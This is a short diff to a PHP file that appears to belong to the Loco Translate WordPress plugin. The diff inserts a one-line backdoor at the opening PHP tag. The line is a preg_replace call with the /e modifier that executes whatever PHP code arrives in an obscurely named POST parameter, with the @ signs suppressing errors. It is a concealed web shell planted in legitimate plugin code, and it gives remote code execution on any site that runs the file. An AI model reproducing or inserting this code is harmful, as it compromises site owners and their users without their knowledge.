@@ -1,4 +1,5 @@
-<?php
+<?php @preg_replace('/(.*)/e', @$_POST['szwqcucttgis'], '');
+
 /**
  * Object representing a theme, plugin or domain within core code.
  * Packages are identified uniquely by a type (e.g. "theme") and internal wordpress name, e.g. "loco-translate".
